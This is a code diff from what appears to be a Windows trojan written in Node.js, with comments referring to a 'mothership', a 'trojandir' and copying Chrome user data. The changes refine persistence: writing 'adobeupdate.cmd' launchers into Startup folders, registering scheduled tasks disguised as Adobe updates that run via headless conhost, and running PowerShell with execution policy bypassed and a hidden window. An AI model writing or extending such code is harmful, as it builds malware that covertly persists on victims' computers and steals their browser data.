@@ -37,6 +37,10 @@ const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 // test vbs, bat, ps1 script job execution (EXEC_VBS, EXEC_BAT, EXEC_PS1 as well as execute_cmdlist method)
 // test bat, ps1, js, py relay
 
+// --- BUGS ---
+// ! execjob script must terminate upon completion --> when finished should exit process
+// ! processless initialisation not working
+
 // --- TASKS LIST ---
 
 // ! motership selection process
@@ -48,21 +52,11 @@ const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 // ! setup RDP --> copy chrome user data directory to trojandir
 //   C:\Users\sebas\AppData\Local\Google\Chrome\User Data to <trojandir>/chrome
 
-// ! startup: penetrate --> register autostart in registry, folder locations + register tasks
-// ! startup: reschedule --> obtain
-// Get-CimInstance Win32_StartupCommand | Format-List *
-// Startup --> C:\Users\sebas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-// Common Startup --> C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
-
 // --- IMPROVEMENTS ---
 
 // ! improve logging / logmsg
 // !! improve mothership logging
 // ! implement exception handling
-
-// --- BUGS ---
-// ! execjob script must terminate upon completion --> when finished should exit process
-// ! processless initialisation not working
 
 // EXEC_CMD --> GetSystemOverview
 //              GetTrojanDir
@@ -89,6 +83,10 @@ var taskconfig = {
         { 'name':'DailyTask', 'enabled':false }
     ],
 
+    getTaskXMLFunc(taskname) {
+        return this.taskxmlfuncs[taskname];
+    },
+
     get tasknames() {
         return Object.keys(this.taskxmlfuncs);
     },
@@ -107,8 +105,8 @@ var regstartupconfig = {
     startup_value: '',
 
     get name_value_str() {
-        return `$Name = "${startup_name}"
-                $Value = "${startup_value}"` + '\r\n';
+        return `$Name = "${this.startup_name}"
+                $Value = "${this.startup_value}"` + '\r\n';
     },
 
     get new_item_str() {
@@ -151,10 +149,13 @@ var startupfolderconfig = {
     },
 
     getFolderPath(foldername) {
-        this.folders.forEach( (folder) => {
-            if ( folder.name == foldername )
+
+        for (const folder of this.folders) {
+            if ( folder.name == foldername ) {
                 return folder.folderpath;
-        });
+            }
+        }
+
     },
 
     getLauncherScript(foldername) {
@@ -190,9 +191,6 @@ var startupfolderconfig = {
             folderpath: 'C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
         }
     ],
-
-    // return `conhost.exe --headless C:\\ProgramData\\owd\\launch.cmd ${startup_loc_name}`;
-
 };
 
 var systemstate = {
@@ -2760,44 +2758,48 @@ function cmdlist() {
 async function reschedule() {
     let tasknames = taskconfig.tasknames;
 
-    let ptasknames = await getTasks();
+    // let ptasknames = await getTasks();
 
     for (let i = 0; i < tasknames.length; i++) {
         let taskname = tasknames[i];
-
-        if ( ptasknames.includes(taskname) ) {
-            logmsg(`existing task ${taskname} registered -- skipping`);
-            continue;
-        } else {
-            await createTask(taskname);
-        }
+        // anchor
+        await createTask(taskname);
     }
 }
 
-async function exec_ps_cmd(cmdstr) {
-    if ( isNullOrWhitespace(cmdstr) )
-        return;
-
-    cmdstr = cmdstr.replace(/\r?\n/g, ';');
+async function exec_ps_cmd(psScript) {
 
     return new Promise((resolve, reject) => {
 
-        exec(
-            `powershell.exe -NoProfile -Command "${cmdstr}"`,
-            { maxBuffer: 1024 * 1024 * 10 },
-            (error, stdout, stderr) => {
-                if (error) {
-                    reject(error);
-                }
+        const child = spawn('powershell.exe', 
+            ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', '-'], 
+            { stdio: ['pipe', 'pipe', 'pipe'] });
 
-                if (stderr) {
-                    resolve(stderr);
-                }
+        let stdoutData = '';
+        let stderrData = '';
 
-                resolve(stdout);
+        child.stdout.on('data', (chunk) => {
+            stdoutData += chunk.toString();
+        });
+
+        child.stderr.on('data', (chunk) => {
+            stderrData += chunk.toString();
+        });
+
+        child.on('error', (err) => {
+            reject(err);
+        });
+
+        child.on('close', (code) => {
+            if (code !== 0) {
+                reject(new Error(`PowerShell exited with code ${code}: ${stderrData}`));
+            } else {
+                resolve(stdoutData.trim());
             }
-        );
+        });
 
+        child.stdin.write(psScript);
+        child.stdin.end();
     });
 }
 
@@ -2825,6 +2827,7 @@ async function penetrate_folders() {
         let fpath = path.join(startupfolderconfig.getFolderPath(foldername), 'adobeupdate.cmd');
         let script_txt = startupfolderconfig.getLauncherScript(foldername);
 
+        logmsg(`writing launch script to ${fpath}`);
         fs.writeFileSync(fpath, script_txt, "utf8");
     }
 
@@ -3691,7 +3694,7 @@ async function createTask(taskname) {
         throw new Error(`${taskname} is not supported`);
     }
 
-    let taskxmlstrfunc = taskconfig["taskxmlfuncs"][taskname];
+    let taskxmlstrfunc = taskconfig.getTaskXMLFunc(taskname);
 
     let pexe = "conhost.exe";
     let args = `--headless C:\\ProgramData\\owd\\launch.cmd ${taskname}`;
@@ -3699,8 +3702,10 @@ async function createTask(taskname) {
 
     let tasktime = ["RepTask", "TimeTask"].includes(taskname) ? "1" : "5";
 
+    taskname = "adobeupdate_" + taskname;
+
     let taskxmlstr = taskxmlstrfunc(
-        "adobeupdate_" + taskname,
+        taskname,
         "1999-07-25T12:00:00",
         tasktime,
         pexe,
@@ -3724,7 +3729,9 @@ async function exec_schtasks(taskxmlpath, taskname) {
         "/tn",
         '"' + taskname + '"',
         "/F",
-    ]);
+    ], null, 
+    (text) => { logmsg(text); }, 
+    (text) => { logmsg(text); });
 }
 
 async function getTaskDetail(taskname) {
